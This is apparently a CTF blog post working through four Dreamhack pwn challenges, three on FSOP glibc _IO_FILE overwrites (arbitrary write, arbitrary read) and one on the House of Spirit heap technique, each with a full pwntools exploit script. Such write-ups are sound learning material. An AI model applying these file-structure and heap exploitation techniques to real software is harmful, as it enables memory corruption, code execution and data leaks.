---
title: "Dreamhack Pwn"
date: 2026-06-17
draft: false
description: Just a few note about some pwn challenge on dreamhack
tags: ["Pwn"]
---

### IO_FILE AW
Link: https://dreamhack.io/wargame/challenges/55

#### Description
This challenge is a FSOP-related bug

This challenge's bug is not trivial, it is set up for learning purpose
The bug is basically programmed, we could overwrite the stdin which is the `_IO_FILE` libc's struct

```c
        dest = stdin;
        if ( src )
          memcpy(dest, src, 0x40u);
```

Take a look at the `_IO_FILE` struct
```c 
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
 
  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
 
  struct _IO_marker *_markers;
 
  struct _IO_FILE *_chain;
 
  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
 
#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
 
  /*  char* _save_gptr;  char* _save_egptr; */
 
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
So basically our concentrated fields are the first nine variable and the _fileno in this challenge
Additionally there is `_IO_FILE_plus` which is the structure of `_IO_FILE` and the struct IO_jump_t vtable which point to many native functions for example `__write/__read` and some essential function like `__underflow` or `__overflow` but we won't take a look at those stuff in this challenge

The ultimate purpose of overwriting an `_IO_FILE` struct is to hijack the libc stdin/stdout execution flow to do whatever we want 

Now lets take a look at this challenge. We would like to do something with the fgets function because we are able to overwrite the stdin structure which we could hijack input function

Look into the libc source code we could see that `fgets` is the `_IO_fgets`, we could conclude this by looking at the libc source or dynamically debug the challenge when it calls the fgets function

```c
char *
_IO_fgets (char *buf, int n, _IO_FILE *fp)
{
  _IO_size_t count;
  char *result;
  int old_error;
  CHECK_FILE (fp, NULL);
  if (n <= 0)
    return NULL;
  if (__glibc_unlikely (n == 1))
    {
      /* Another irregular case: since we have to store a NUL byte and
	 there is only room for exactly one byte, we don't have to
	 read anything.  */
      buf[0] = '\0';
      return buf;
    }
  _IO_acquire_lock (fp);
  /* This is very tricky since a file descriptor may be in the
     non-blocking mode. The error flag doesn't mean much in this
     case. We return an error only when there is a new error. */
  old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
  fp->_IO_file_flags &= ~_IO_ERR_SEEN;
  count = _IO_getline (fp, buf, n - 1, '\n', 1);
  /* If we read in some bytes and errno is EAGAIN, that error will
     be reported for next read. */
  if (count == 0 || ((fp->_IO_file_flags & _IO_ERR_SEEN)
		     && errno != EAGAIN))
    result = NULL;
  else
    {
      buf[count] = '\0';
      result = buf;
    }
  fp->_IO_file_flags |= old_error;
  _IO_release_lock (fp);
  return result;
}
```

There is a few note, when there is a bug related to fsop that we could control the stdin, it means we could somehow abitrary write stuffs and when we are able to control the stdout, we could somehow abitrary read stuffs

Then we want the execution flow is `_IO_fgets` -> `_IO_getline` -> `uflow` -> `_IO_UFLOW` -> `__uflow` -> `_IO_default_uflow` -> `_IO_UNDERFLOW` -> `__underflow` -> `_IO_new_file_underflow`

The reason why we want to access the `_IO_new_file_underflow` is this part 

```c
fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
fp->_IO_read_end = fp->_IO_buf_base;
fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
  = fp->_IO_buf_base;
count = _IO_SYSREAD (fp, fp->_IO_buf_base,
          fp->_IO_buf_end - fp->_IO_buf_base);
```
If we somehow bypass the condition check above and lead the flow to this position, we could abitrary write into `_IO_buf_base` 
To bypass all the above deadlock's branch, we could change the flags to make all if-statements go wrong

For example
```c
if (fp->_flags & _IO_EOF_SEEN)
  return EOF;
```
We could unmask the `_IO_EOF_SEEN` to skip this for example. This process is simple but cost time

#### PoC
```python
#!/usr/bin/env python3
from pwn import *

dir = "./iofile_aw_patched"
exe = context.binary = ELF(dir, checksec=False)
libc = ELF("./libc.so.6")

gdbscript = """
b * 0x0000000000400ADD
b * 0x00000000004009F2
continue
"""

def start():
    if args.GDB:
        return gdb.debug([dir], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process([dir])

p = start()

def exploit():
    
    payload = flat(
        0xfbad208b,
        exe.sym['size'],
        0, 0, 0, 0, 0,
        exe.sym['size'],
    )
    p.sendlineafter(b'# ', b'printf ' + payload)

    p.sendafter(b'# ', b'read'.ljust(0x200, b'\0'))
    p.sendline(p32(0x1000))
    
    p.sendlineafter(b'#', cyclic(552) + p64(exe.sym['get_shell']))
    p.sendlineafter(b'#', b'exit')
    pass

exploit()
p.interactive()
```

### IO_FILE Arbitrary Address Write
Link: https://dreamhack.io/wargame/challenges/367

#### Description
In this challenge we need to overwrite a global variable to 0xdeadbeef to retrieve the flag 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  buf = fopen("/etc/issue", "r");
  printf("Data: ");
  read(0, buf, 0x12Cu);
  fread(ptr, 1u, 0x3FFu, buf);
  printf("%s", ptr);
  if ( overwrite_me == 0xDEADBEEF )
    read_flag();
  fclose(buf);
  return 0;
}
```
We could see that we again are able to overwrite an `_IO_FILE` struct, here is a custom `FILE *` once not the stdin or stdout, we could overwrite up `0x12C` equivalent to fully control the struct

Take a look at the `_IO_FILE` struct
```c 
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
 
  struct _IO_marker *_markers;
 
  struct _IO_FILE *_chain;
 
  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
 
#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
 
  /*  char* _save_gptr;  char* _save_egptr; */
 
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
The `fopen` openned a file with `r` mode which means this serves reading content in the stream. So the `IO` should act like this, it will read and store in read buffer, then starting to consume bytes respectively, if the buffer ends, it will start to underflow the read buffer and start to trigger read syscall to get more input

So in order to write a specific address we need to change the IO_buf_base and IO_buf_end address as well as change the execution flow
We want this order
`fread` -> `__fread_chk` -> `_IO_sgetn` -> `_IO_file_xsgetn` -> `__underflow` -> `_IO_new_file_underflow`

Important part in the `_IO_file_xsgetn`
```
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;
    continue;
  }
```
This part `want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)`. Because want is the size of fread which means `0x3FF` so our condition for `_IO_buf_` need to at least `0x400`

Now, come to the `_IO_new_file_underflow` everything is similar to the challenge [IO_FILE AW](#io_file-aw). Leveraging the `_IO_SYSREAD` to arbitrary write into `overwrite_me` global variable to 0xdeadbeef

In the real PoC, you could set the `IO_buf_base` direct to the overwrite_me variable, because I want to safely overwrite all the length of fread, so I decided to move it back a little bit to match the total size

Don't forget to overwrite the fileno to 0 which means stdin, so we could feed our payload

#### PoC
```python 
#!/usr/bin/env python3
from pwn import *

dir = "./vuln"
exe = context.binary = ELF(dir, checksec=False)
# libc = ELF("./libc.so.6")

gdbscript = """
b * 0x000000000040088E
b * 0x00000000004008D1
continue
"""

def start():
    if args.GDB:
        return gdb.debug([dir], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process([dir])

p = start()

def exploit():
    
    payload = flat(
        0xfbad8000,
        # read ptr
        0x6010A5,
        # read end
        0x6010A5,
        # read base 
        0x6010A5,
        # write stuff
        0, 0, 0,
        # buf base, end
        0x6010A5,
        0x6014A8,
        p64(0) * 5, 
        0
    )

    p.sendafter(b'Data: ', payload)
    # pause()
    p.send(b'A' * 0x3fb + p32(0xdeadbeef))
    
    pass

exploit()
p.interactive()
```

### IO_FILE Arbitrary Address Read
Link: https://dreamhack.io/wargame/challenges/366

#### Description
Challenge code
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  read_flag();
  fp = fopen("/tmp/testfile", "w");
  printf("Data: ");
  read(0, fp, 300u);
  fwrite("TEST FILE!", 1u, 0x400u, fp);
  fclose(fp);
  return 0;
}
```
First the read_flag() will store the flag into a global buffer, our goal is to leak its value using fsop with the `fwrite` function

The `fwrite` calls the `_IO_new_file_xsputn` internal libc function. The next target we want to trigger is the `__overflow` -> `_IO_new_file_overflow`

In order to do that we just need to skip these two if-statements

```c
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
```

```c
else if (f->_IO_write_end > f->_IO_write_ptr)
  count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
/* Then fill the buffer. */
if (count > 0)
```
Overwrite the flag and `_IO_write_end = _IO_write_ptr = 0`
Then it will go through this branch

```c
if (to_do + must_flush > 0)
  {
    size_t block_size, do_write;
    /* Next flush the (full) buffer. */
    if (_IO_OVERFLOW (f, EOF) == EOF)
      ....
```

We need to trigger this
```c
if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
      f->_IO_write_ptr - f->_IO_write_base);
```
`_IO_do_write` function will write our payload into write_base and we could arbitrary read by changing the fileno to stdout and change write_base to specific address. That is all

#### PoC
```python
#!/usr/bin/env python3
from pwn import *

dir = "./vuln"
exe = context.binary = ELF(dir, checksec=False)
# libc = ELF("./libc.so.6")

gdbscript = """
set debuginfod enabled on
b * 0x00000000004007DA
continue
"""

def start():
    if args.GDB:
        return gdb.debug([dir], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process([dir])

p = start()

def exploit():
    
    leak_addr = 0x6010A0
    leak_size = 0x50
    payload = flat(
        0xfbad1800,
        0, 0, 0,
        leak_addr,
        leak_addr + leak_size,
        leak_addr + leak_size,
        0, 0, 0, 0, 0, 0, 0, 1
    )

    p.sendafter(b'Data: ', payload)

    pass

exploit()
p.interactive()
```

### House of Spirit 
Link: https://dreamhack.io/wargame/challenges/54

#### Description
First we need to understand what is house of spirit, so basically this is one of heap exploitation technique that leverage the permission of freeing an abitrary address we could create a fake tcache chunk and manage to write into that chunk with our intended region's size (for example we could create a fake chunk in a writable or region that program allow and use an intended length to overwrite outsite that range or to specific address to hijack the execution flow)

#### PoC
First we create a fake tcache chunk in anywhere we could, for example our writable section or stack, then if we are able to control the free address and free that range we could put that chunk into a tcache and then reclaim it and we will have a wider writable region.

For example, program require us to type something and it is stored on stack and we somehow able to leak any stack address, we could calculate the offset and another somehow we able to adjust our free address, we could free that address.

This challenge only teach us how to get familar with house of spirit so it is programmed in the way that the bug is not trivial but deliberated 

```python
#!/usr/bin/env python3
from pwn import *

dir = "./vuln"
exe = context.binary = ELF(dir, checksec=False)
# libc = ELF("./libc-2.31.so")

gdbscript = """
b * 0x0000000000400A0F
continue
"""

def start():
    if args.GDB:
        return gdb.debug([dir], gdbscript=gdbscript)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process([dir])

p = start()

def free(addr):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Addr: ', str(addr).encode())

def malloc(data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(len(data)).encode())
    p.sendafter(b'Data: ', data)

def exploit():

    # Stage 1: setup tcache fake chunk

    payload = flat(
        p64(0),
        p64(0x40)
    )
    p.sendafter(b'name: ', payload)
    stack_leak = int(p.recvline().split(b': ')[0].decode(), 16)
    log.info(hex(stack_leak))

    malloc(b'a')

    # Stage 2: free and reclaim fake chunk
    free(stack_leak + 0x10)

    win = 0x0000000000400940
    malloc(flat(
        b'A' * 40,
        p64(win)        
    ))  

    p.sendlineafter(b'> ', b'3')

    pass

exploit()
p.interactive()
```